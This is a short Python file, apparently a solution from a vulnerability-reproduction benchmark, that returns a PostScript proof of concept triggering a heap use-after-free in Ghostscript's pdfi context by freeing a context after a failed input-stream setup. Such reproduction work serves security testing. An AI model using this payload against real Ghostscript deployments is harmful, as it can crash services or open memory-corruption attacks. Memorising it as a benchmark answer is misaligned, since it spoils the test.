import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: Ghostscript Heap Use-After-Free in pdfi context (arvo:42280)
        """
        # The vulnerability is triggered when setting the input stream for a pdfi context fails
        # (e.g. due to invalid PDF header), but the context is subsequently accessed.
        # We use a PostScript script to drive the pdfi operators directly.
        
        poc = (
            b"%!PS\n"
            b"{\n"
            b"  % Access the PDFI ProcSet to ensure pdfi operators are available\n"
            b"  /PDFI /ProcSet findresource begin\n"
            b"  \n"
            b"  % Create a new PDFI context\n"
            b"  /ctx .pdfi_create_context def\n"
            b"  \n"
            b"  % Create a stream with invalid PDF content (fails header check)\n"
            b"  % ReusableStreamDecode is used to create a seekable stream from a string\n"
            b"  /s (InvalidPDFHeader) /ReusableStreamDecode filter def\n"
            b"  \n"
            b"  % Attempt to set the input stream. This will fail internally.\n"
            b"  % We wrap in 'stopped' to catch the error and continue execution.\n"
            b"  { ctx s .pdfi_set_input_stream } stopped pop\n"
            b"  \n"
            b"  % Trigger the UAF by freeing the context, which accesses the invalid state\n"
            b"  ctx .pdfi_free_context\n"
            b"  \n"
            b"  end\n"
            b"} stopped pop\n"
        )
        return poc
